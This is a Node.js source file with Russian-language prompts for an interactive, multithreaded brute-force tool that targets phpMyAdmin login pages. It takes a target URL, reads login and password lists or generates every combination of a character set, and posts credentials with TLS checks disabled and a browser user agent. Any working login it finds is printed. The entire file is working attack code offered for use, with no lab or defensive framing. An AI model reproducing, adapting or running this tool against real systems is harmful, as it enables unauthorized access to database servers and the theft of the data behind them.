const https = require('https');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

// Создаем интерфейс для ввода данных пользователем
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

class Bruteforcer {
    constructor(options) {
        this.config = {
            url: options.url,
            loginsFile: options.loginsFile,
            passwordsFile: options.passwordsFile,
            generatePasswords: options.generate,
            chars: options.chars || 'abcdefghijklmnopqrstuvwxyz0123456789',
            minLen: options.min || 4,
            maxLen: options.max || 8,
            threads: options.threads || 5,
            delay: options.delay || 1000,
            userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        };
        this.attempts = 0;
        this.found = false;
        this.logins = [];
        this.passwords = [];
    }

    async loadFile(filename) {
        const result = [];
        const filePath = path.resolve(filename);

        if (!fs.existsSync(filePath)) {
            throw new Error(`Файл не найден: ${filePath}`);
        }

        const fileStream = fs.createReadStream(filePath);
        const rl = readline.createInterface({
            input: fileStream,
            crlfDelay: Infinity
        });

        for await (const line of rl) {
            const trimmed = line.trim();
            if (trimmed) result.push(trimmed);
        }

        if (result.length === 0) {
            throw new Error(`Файл пустой: ${filePath}`);
        }

        return result;
    }

    async loadLogins() {
        this.logins = await this.loadFile(this.config.loginsFile);
    }

    async loadPasswords() {
        if (this.config.generatePasswords) {
            this.passwords = Array.from(this.generatePasswords());
        } else if (this.config.passwordsFile) {
            this.passwords = await this.loadFile(this.config.passwordsFile);
        } else {
            throw new Error('Не указан файл с паролями или флаг генерации паролей');
        }
    }

    *generatePasswords() {
        for (let len = this.config.minLen; len <= this.config.maxLen; len++) {
            yield* this.generateCombinations('', len);
        }
    }

    *generateCombinations(prefix, length) {
        if (length === 0) {
            yield prefix;
            return;
        }
        for (const char of this.config.chars) {
            yield* this.generateCombinations(prefix + char, length - 1);
        }
    }

    async run() {
        try {
            console.log('[+] Загрузка данных...');
            await this.loadLogins();
            await this.loadPasswords();

            console.log('[+] Параметры атаки:');
            console.log(`- Цель: ${this.config.url}`);
            console.log(`- Логинов: ${this.logins.length}`);
            console.log(`- Паролей: ${this.passwords.length}`);
            console.log(`- Потоков: ${this.config.threads}`);
            console.log(`- Задержка: ${this.config.delay}мс`);

            if (this.config.generatePasswords) {
                console.log(`- Генерация паролей: ${this.config.minLen}-${this.config.maxLen} символов`);
                console.log(`- Используемые символы: ${this.config.chars}`);
            }
            console.log('');

            const startTime = Date.now();
            const workers = [];
            const total = this.logins.length * this.passwords.length;
            const chunkSize = Math.ceil(total / this.config.threads);

            for (let i = 0; i < this.config.threads; i++) {
                const start = i * chunkSize;
                const end = Math.min(start + chunkSize, total);

                const worker = new Worker(__filename, {
                    workerData: {
                        config: this.config,
                        logins: this.logins,
                        passwords: this.passwords,
                        start,
                        end
                    }
                });

                worker.on('message', (msg) => {
                    if (msg.type === 'found') {
                        this.found = true;
                        console.log(`\n[+] УСПЕХ: ${msg.login}:${msg.password}`);
                        console.log(`[+] Попыток: ${this.attempts}/${total}`);
                        console.log(`[+] Время: ${((Date.now() - startTime) / 1000).toFixed(2)} сек`);
                        workers.forEach(w => w.terminate());
                    } else if (msg.type === 'progress') {
                        this.attempts++;
                        process.stdout.write(`\rПопыток: ${this.attempts}/${total} (${((this.attempts / total) * 100).toFixed(1)}%)`);
                    }
                });

                workers.push(worker);
            }

            await Promise.all(workers.map(w => new Promise(resolve => w.on('exit', resolve))));

            if (!this.found) {
                console.log('\n[-] Действующие учетные данные не найдены');
            }
        } catch (error) {
            console.error('\n[-] Ошибка:', error.message);
            process.exit(1);
        }
    }
}

// Worker thread (остается без изменений)
if (!isMainThread) {
    const { config, logins, passwords, start, end } = workerData;

    const tryLogin = async (login, password) => {
        const postData = `pma_username=${encodeURIComponent(login)}&pma_password=${encodeURIComponent(password)}`;

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': config.userAgent
            },
            rejectUnauthorized: false
        };

        return new Promise((resolve) => {
            const req = https.request(config.url, options, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    if (res.statusCode === 302 && res.headers.location && res.headers.location.includes('index.php')) {
                        resolve(true);
                    } else if (data.includes('Welcome to phpMyAdmin')) {
                        resolve(true);
                    } else {
                        resolve(false);
                    }
                });
            });

            req.on('error', () => resolve(false));
            req.write(postData);
            req.end();
        });
    };

    (async () => {
        for (let i = start; i < end && !workerData.found; i++) {
            const login = logins[Math.floor(i / passwords.length)];
            const password = passwords[i % passwords.length];

            if (await tryLogin(login, password)) {
                parentPort.postMessage({ type: 'found', login, password });
                break;
            }

            parentPort.postMessage({ type: 'progress' });
            await new Promise(resolve => setTimeout(resolve, config.delay));
        }
        parentPort.postMessage({ type: 'done' });
    })();
}

// Main thread с интерактивным вводом
if (isMainThread) {
    const askQuestion = (question) => {
        return new Promise((resolve) => {
            rl.question(question, (answer) => {
                resolve(answer.trim());
            });
        });
    };

    (async () => {
        console.log('=== Bruteforce для phpMyAdmin ===');
        console.log('Введите параметры для атаки:\n');

        // Запрашиваем URL
        const url = await askQuestion('URL цели (например, http://site.com/pma/): ');
        if (!url) {
            console.log('URL обязателен для ввода!');
            process.exit(1);
        }

        // Запрашиваем файл с логинами
        const loginsFile = await askQuestion('Путь к файлу с логинами: ');
        if (!loginsFile) {
            console.log('Файл с логинами обязателен!');
            process.exit(1);
        }

        // Выбираем метод работы с паролями
        const passwordMethod = await askQuestion('Использовать файл с паролями (1) или сгенерировать автоматически (2)? [1/2]: ');
        
        let options = {
            url: url,
            loginsFile: loginsFile,
            threads: 5,
            delay: 1000
        };

        if (passwordMethod === '1') {
            // Используем файл с паролями
            const passwordsFile = await askQuestion('Путь к файлу с паролями: ');
            if (!passwordsFile) {
                console.log('Файл с паролями обязателен!');
                process.exit(1);
            }
            options.passwordsFile = passwordsFile;
            options.generate = false;
        } else if (passwordMethod === '2') {
            // Генерируем пароли
            options.generate = true;
            
            const chars = await askQuestion('Используемые символы (по умолчанию: abcdefghijklmnopqrstuvwxyz0123456789): ');
            if (chars) options.chars = chars;
            
            const minLen = await askQuestion('Минимальная длина пароля (по умолчанию 4): ');
            if (minLen) options.min = parseInt(minLen);
            
            const maxLen = await askQuestion('Максимальная длина пароля (по умолчанию 8): ');
            if (maxLen) options.max = parseInt(maxLen);
        } else {
            console.log('Неверный выбор!');
            process.exit(1);
        }

        // Дополнительные параметры
        const threads = await askQuestion('Количество потоков (по умолчанию 5): ');
        if (threads) options.threads = parseInt(threads);
        
        const delay = await askQuestion('Задержка между запросами в мс (по умолчанию 1000): ');
        if (delay) options.delay = parseInt(delay);

        rl.close();

        // Запускаем bruteforce
        new Bruteforcer(options).run();
    })();
}
